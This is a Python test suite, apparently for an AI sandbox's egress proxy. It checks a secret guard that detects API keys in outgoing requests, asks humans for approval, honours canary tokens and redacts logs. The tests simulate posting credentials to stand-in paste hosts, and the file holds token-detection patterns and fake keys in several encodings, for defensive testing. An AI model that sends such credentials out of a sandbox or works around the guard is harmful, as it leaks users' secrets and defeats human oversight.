    """Answer the next question that appears in DIRECTORY (a thread), as the host's `approvals` does."""
    def run():
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            for path in sorted(Path(directory).glob("*.json")):
                if path.name not in seen:
                    seen.add(path.name)
                    temporary = path.with_suffix(".answer.tmp")
                    temporary.write_text(json.dumps({"decision": decision, "scope": scope}))
                    os.replace(temporary, path.with_suffix(".answer"))
                    return
            time.sleep(0.02)
    threading.Thread(target=run, daemon=True).start()


def test_the_whole_chain_from_the_request_to_the_humans_answer(world, tmp_path):
    """The proxy asks the supervisor over its channel, the supervisor's broker files the question where the host reads
    it, the host's answer comes back: allowed for the run, the same kind of value to the same host is not asked about
    again - another host is."""
    directory = tmp_path / "approvals"
    broker = rt.ApprovalBroker(directory, rt.RuntimeNetwork({}, None, lambda rules: None), timeout=5, poll=0.02)
    left, right = socket.socketpair()
    threading.Thread(target=rt.serve_asks, args=(right, broker), daemon=True).start()
    world.start(settings(on_shape="ask"), asker=rt.AskChannel(left, timeout=10))
    seen = set()
    answer_next(directory, "allow", "always", seen)
    assert world.send("paste.example", "/raw/1", TEST_FILE.encode()).startswith(b"HTTP/1.1 200")
    (name,) = seen
    text = (directory / name).read_text()
    question = json.loads(text)
    assert question["kind"] == "http" and question["secret"]["found"][0]["label"] == "Google API key"
    assert question["secret"]["allow"] == "sandbox-ai secret-guard allow google-api-key@paste.example"
    assert no_secret_in(text) and "body" not in question
    assert approvals.widest_answer(question, {}, "always") == "run"
    done = json.loads((directory / name).with_suffix(".done").read_text())
    assert done["decision"] == "allow" and done["scope"] == "run"
    # another path and another file with such a key, the same host: covered by the answer for the run
    other = TEST_FILE.replace(GOOGLE_KEY, GOOGLE_KEY[:-6] + "zzzzzz").encode()
    assert world.send("paste.example", "/raw/2", other).startswith(b"HTTP/1.1 200") and len(seen) == 1
    # another host, another kind of value: asked
    answer_next(directory, "deny", "run", seen)
    assert world.send("mcp.example", "/raw/1", TEST_FILE.encode()).startswith(b"HTTP/1.1 403") and len(seen) == 2
    answer_next(directory, "deny", "once", seen)
    refused = world.send("paste.example", "/raw/1", OTHER_GITHUB.encode())
    assert refused.startswith(b"HTTP/1.1 403") and len(seen) == 3
    # nobody answers: refused, and the refusal says how to answer and how to allow
    broker.timeout = 0.3
    slow = world.send("paste.example", "/raw/1", PRIVATE_KEY.encode())
    assert slow.startswith(b"HTTP/1.1 403") and b"not answered yet" in slow
    assert b"sandbox-ai approvals allow " in slow and b"--allow-send private-key@paste.example" in slow
    assert no_secret_in(world.log.read_text(), *(path.read_text() for path in directory.iterdir()))


# --- what stays as it was ---------------------------------------------------------------------------------------------

def test_without_the_guard_nothing_is_searched_or_recorded(world):
    world.start(secrets=False)
    assert world.proxy.server.secret_guard is None
    assert world.send("paste.example", "/raw", TEST_FILE.encode() + API_TOKEN.encode()).startswith(b"HTTP/1.1 200")
    assert "secret" not in world.records()[-1]


def test_requests_without_a_secret_get_no_field_and_pass_unchanged(world):
    world.start(settings(on_send="block", on_shape="block"))
    body = json.dumps({"text": "nothing here: sk-learn, hf_hub_download, ghp_x, AKIA, npm_config_cache " * 50}).encode()
    for host in ("paste.example", PROVIDER):
        assert world.send(host, "/v1/x?a=b", body, ["Content-Type: application/json"]).startswith(b"HTTP/1.1 200")
        assert world.seen[-1][4] == body
        assert world.send(host, "/v1/x").startswith(b"HTTP/1.1 200")
    assert all("secret" not in record for record in world.records())


def test_a_kept_alive_connection_goes_on_after_a_reported_request(world):
    """Two requests on one connection: the first carries a secret and is reported (searched once its body went out),
    the second is its own request with its own record."""
    world.start()
    context = ssl.create_default_context(cafile=str(world.pki["ca"]))
    port = world.proxy.port

    def answer_of(tls):
        data = b""
        while b"\r\n\r\n" not in data or len(data.split(b"\r\n\r\n", 1)[1]) < 12:
            data += tls.recv(65536)
        return data
    with socket.create_connection(("127.0.0.1", port)) as raw, \
            context.wrap_socket(raw, server_hostname="paste.example") as tls:
        first = TEST_FILE.encode()
        tls.sendall(b"POST /one HTTP/1.1\r\nHost: paste.example\r\nContent-Length: %d\r\n\r\n" % len(first) + first)
        assert answer_of(tls).startswith(b"HTTP/1.1 200")
        tls.sendall(b"POST /two HTTP/1.1\r\nHost: paste.example\r\nContent-Length: 5\r\n\r\nhello")
        assert answer_of(tls).startswith(b"HTTP/1.1 200")
    # (the client has its answer before the proxy writes the record: wait for the second request's)
    assert world.records(lambda r: r.get("event") == "http" and r.get("url", "").endswith("/two"), wait=10)
    one, two = world.records(lambda r: r.get("event") == "http" and r.get("url", "").endswith(("/one", "/two")))[-2:]
    assert one["secret"]["found"][0]["id"] == "google-api-key" and "secret" not in two
    assert [path for _, _, path, _, _ in world.seen] == ["/one", "/two"]


def test_a_canary_token_is_still_the_canarys(world):
    """A decoy's token is refused by the canary's own check first (stronger: it stops the sandbox)."""
    token = "canary" + "-" + TAIL[9:40]
    world.start(canary={"forms": [[token, "aws-1", "plain"]], "names": [], "block": True, "model_hosts": [PROVIDER]})
    answer = world.send("paste.example", "/raw", (token + " " + API_TOKEN).encode())
    assert answer.startswith(b"HTTP/1.1 403") and b"must not leave the sandbox" in answer
    record = world.records(lambda r: r.get("event") == "denied")[-1]
    assert record["canary"]["canary"] == "aws-1" and "secret" not in record


# --- rulesets and settings ----------------------------------------------------------------------------------------------

def test_a_rulesets_secrets_section():
    checked = rt.Ruleset.validated({"version": 1, "secrets": {"on_send": "block", "on_shape": "ask"}}, "strict")
    assert checked["secrets"] == {"on_send": "block", "on_shape": "ask"}
    assert "secrets" not in rt.Ruleset.validated({"version": 1}, "plain")
    for junk in ({}, {"on_send": "stop"}, {"on_shape": "deny"}, {"on_read": "report"}, "block", {"on_send": True}):
        with pytest.raises(rt.RuleError, match=r'"secrets" takes "on_send" and "on_shape" \(report, ask, block\)'):
            rt.Ruleset.validated({"version": 1, "secrets": junk}, "broken")
    with pytest.raises(rt.RuleError, match='"secrets" acts on the run'):
        rt.Ruleset.validated({"version": 1, "mode": "audit", "secrets": {"on_send": "block"}}, "trial")


def test_the_strictest_of_the_rulesets_and_the_mode_wins():
    decided = rt.secret_decisions([("mode high", {"on_send": "block", "on_shape": "ask"}),
                                   ("--rules lax.json", {"on_send": "report", "on_shape": "report"}),
                                   ("--rules strict.json", {"on_shape": "block"}), ("junk", "block"),
                                   ("odd", {"on_send": "stop"})])
    assert decided == {"on_send": "block", "on_shape": "block",
                       "by": {"on_send": "mode high", "on_shape": "--rules strict.json"}}
    assert rt.secret_decisions([]) == {"on_send": "report", "on_shape": "report", "by": {}}


def test_the_guard_takes_only_settings_that_are_settings():
    guard = rt.SecretGuard({"on_send": "stop", "on_shape": 5, "forms": [["short", "x", "plain"], "junk", ["a" * 20, 5]],
                            "values": [{"id": "x" * 500}, "junk", {"id": "ok:1", "label": 7, "hosts": "h"}],
                            "shapes": [{"id": "broken", "regex": "(", "label": "x"}, "junk", {"id": 5}],
                            "allow": "all", "providers": [5, "Api.Provider.Test."]})
    assert guard.settings == {"on_send": "report", "on_shape": "report"}
    assert not guard.matcher and not guard.shapes.shapes and guard.allow == []
    assert guard.providers == {"api.provider.test"} and guard.strictest == "report"
    assert rt.SecretGuard({}).head("/x?a=1", [["Authorization", "Bearer " + OTHER_GITHUB]], "paste.example") == []


def test_the_shapes_are_the_privacy_checks_and_each_has_its_anchors():
    privacy = load("sandbox_privacy_secrets", "privacy.py")
    blocking = [(ident, regex, reason) for ident, regex, severity, reason in privacy.BUILTIN
                if severity == privacy.BLOCK]
    shapes = guard_host.shapes()
    assert [(shape["id"], shape["regex"], shape["label"]) for shape in shapes] == blocking
    assert all(shape["anchors"] for shape in shapes), "a shape without anchors is searched the slow way"
    samples = {"private-key": PRIVATE_KEY, "aws-access-key-id": "AK" + "IA" + "Q" * 16, "github-token": GIT_TOKEN,
               "github-fine-grained-token": "github" + "_pat_" + TAIL[:30], "gitlab-token": "gl" + "pat-" + TAIL[:24],
               "anthropic-api-key": "sk" + "-ant-" + TAIL[:40], "openai-api-key": "sk" + "-proj-" + TAIL[:40],
               "slack-token": "xo" + "xb-" + "1234567890-abcdef", "google-api-key": GOOGLE_KEY,
               "stripe-secret-key": "rk" + "_live_" + TAIL[:24], "npm-token": "npm" + "_" + TAIL[:36],
               "pypi-token": "pypi" + "-AgE" + TAIL[:60], "huggingface-token": "hf" + "_" + TAIL[:34]}
    assert set(samples) == {shape["id"] for shape in shapes}, "a new shape of the privacy check needs a sample here"
    found = rt.SecretShapes(shapes)
    for ident, sample in samples.items():
        text = ("x = '" + sample + "'\n").encode()
        assert [name for name, _ in found.every(text)] == [ident], ident
        assert [name for name, _ in found.every(b"word" + sample.encode())] in ([], [ident])  # as the regex has it
    # every anchor is one its shape can begin with, and every match goes on as its tail says: what is found through
    # them is what the shapes' own expressions find - in the samples, and in the shortest token of each shape
    slow = rt.SecretShapes([{**shape, "anchors": [], "tail": ""} for shape in shapes])
    text = "\n".join(samples.values()).encode() * 3
    assert sorted(found.every(text)) == sorted(slow.every(text)) and len(found.every(text)) >= len(samples)
    shortest = {"aws-access-key-id": "AS" + "IA" + "0" * 16, "github-token": "gh" + "s_" + "a" * 20,
                "github-fine-grained-token": "github" + "_pat_" + "_" * 22, "gitlab-token": "gl" + "pat-" + "-" * 20,
                "anthropic-api-key": "sk" + "-ant-" + "a" * 20, "openai-api-key": "sk" + "-" + "a" * 32,
                "slack-token": "xo" + "xs-" + "a" * 10, "stripe-secret-key": "sk" + "_live_" + "0" * 20,
                "npm-token": "npm" + "_" + "0" * 36, "huggingface-token": "hf" + "_" + "Z" * 34}
    for ident, token in shortest.items():
        text = b"(" + token.encode() + b")"
        assert [name for name, _ in found.every(text)] == [name for name, _ in slow.every(text)] == [ident], ident
    # look-alikes in ordinary text are no matches, and are dropped before any shape is tried
    alike = b"sk-learn hf_hub_download npm_config_cache ghp_x github_pat_ task-list AKIA ASIAN xoxb-1 pypi-AgE=="
    assert found.every(alike * 50) == slow.every(alike * 50) == []
    assert not any(expression.search(alike) for expression, _ in found.pivots)


# --- the records hold no value --------------------------------------------------------------------------------------------

def test_the_log_never_holds_a_known_value_in_any_form(world):
    world.start()
    hexed = API_TOKEN.encode().hex()
    quoted = urllib.parse.quote(API_TOKEN, safe="")
    for body in (API_TOKEN.encode(), hexed.encode(), json.dumps({"k": API_TOKEN}).encode(),
                 base64.b64encode(b"ab" + API_TOKEN.encode()), b"\x00\x01binary" + API_TOKEN.encode() + b"\xff"):
        assert world.send("paste.example", f"/p?x={quoted}", body, [f"X-Note: {API_TOKEN}"]).startswith(b"HTTP/1.1 200")
    records = world.records()
    assert len(records) == 5 and all(record["secret"]["found"] for record in records)
    assert {found["where"] for record in records for found in record["secret"]["found"]} == {"url", "header", "body"}
    assert no_secret_in(world.log.read_text())
    assert "[redacted]" in world.log.read_text()


# --- performance ----------------------------------------------------------------------------------------------------------

def body_of(size):
    text = json.dumps({"messages": [{"role": "user", "content": "The quick brown fox reads sk-learn docs, hf_hub and "
                                     "npm_config_cache in task-lists; high though. " * 40}] * 30})
    return (text * (size // len(text) + 1)).encode()[:size]


def test_the_guard_costs_a_request_next_to_nothing(world):
    """Measured where it counts: the time until a request's last byte is with the server. Without a hold (the default:
    report) the guard searches a body after it went out, while the server works on its answer."""
    guard = rt.SecretGuard(settings())
    megabyte = body_of(1 << 20)
    # what one search of a whole mebibyte costs (the record's side, after the request went out)
    started = time.perf_counter()
    for _ in range(3):
        scan = rt.SecretScan(guard, "paste.example", False, [])
        assert scan.feed(megabyte) == []
    whole = (time.perf_counter() - started) / 3
    assert whole < 0.25, f"{whole * 1000:.0f} ms to search 1 MiB"
    # a usual request (4 KiB, a JSON body): a few dozen microseconds
    small = body_of(4096)
    headers = [["Host", "paste.example"], ["Content-Type", "application/json"], ["Authorization", "Bearer abc.def"]]
    started = time.perf_counter()
    for _ in range(2000):
        assert guard.head("/v1/items?x=1", headers, "paste.example") == []
        assert rt.SecretScan(guard, "paste.example", False, headers).feed(small) == []
    usual = (time.perf_counter() - started) / 2000
    assert usual < 500e-6, f"{usual * 1e6:.0f} us per usual request"
    # through the proxy: the body is with the server as fast as without the guard (searched afterwards)
    arrived = {}

    def timed(label, secrets):
        world.start(secrets=secrets)
        best = None
        for _ in range(5):
            before = len(world.seen)
            started = time.perf_counter()
            assert world.send(PROVIDER, "/v1/messages", megabyte).startswith(b"HTTP/1.1 200")
            taken = time.perf_counter() - started
            assert len(world.seen) == before + 1
            best = taken if best is None else min(best, taken)
        arrived[label] = best
    timed("without", False)
    timed("with", settings())
    assert arrived["with"] < arrived["without"] * 1.5 + 0.05, arrived
